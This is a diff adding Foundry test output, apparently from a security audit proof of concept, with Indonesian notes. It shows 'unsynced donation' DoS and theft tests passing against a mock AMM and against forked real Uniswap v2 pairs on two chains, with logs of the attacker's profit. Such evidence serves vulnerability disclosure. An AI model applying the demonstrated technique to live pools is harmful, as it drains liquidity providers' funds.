@@ -1,0 +1,30 @@
+$ forge test --match-path test/poc/Poc.t.sol -vv   (salinan repo di /tmp, AMM tiruan)
+Ran 2 tests for test/poc/Poc.t.sol:PocTest
+[PASS] test_unsyncedDonationDoS() (gas: 2624151)
+[PASS] test_unsyncedDonationSteal() (gas: 2781656)
+Logs:
+  protocol LP tokens (1e18) 93170209
+  protocol LP eth (wei)    3800356452501359290
+  attacker out tokens (1e18) 132623775
+  attacker out eth (wei)     5409643547498640707
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 74.10ms (15.09ms CPU time)
+Ran 1 test suite in 101.87ms (74.10ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+
+$ FORK_RPC_*=<RPC publik> forge test --match-path test/poc/ForkDonation.t.sol -vv   (pair Uniswap v2 asli, fork lokal, tanpa broadcast)
+Ran 2 tests for test/poc/ForkDonation.t.sol:ForkDonationPoc
+[PASS] test_base_remote() (gas: 4278871)
+Logs:
+  chain 8453
+  attacker in  tokens/1e18 600000 eth wei 53000000000000000
+  attacker out tokens/1e18 2352767 eth wei 47566820261795435
+  attacker value in  (wei @target) 59000000000000000
+  attacker value out (wei @target) 71094494799887800
+[PASS] test_robinhood_home() (gas: 4342858)
+Logs:
+  chain 4663
+  attacker in  tokens/1e18 30000000 eth wei 5300000000000000000
+  attacker out tokens/1e18 113756125 eth wei 4762245079729261209
+  attacker value in  (wei @target) 5917368421052631578
+  attacker value out (wei @target) 7103226402995225259
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 21.90s (28.26s CPU time)
+Ran 1 test suite in 21.91s (21.90s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
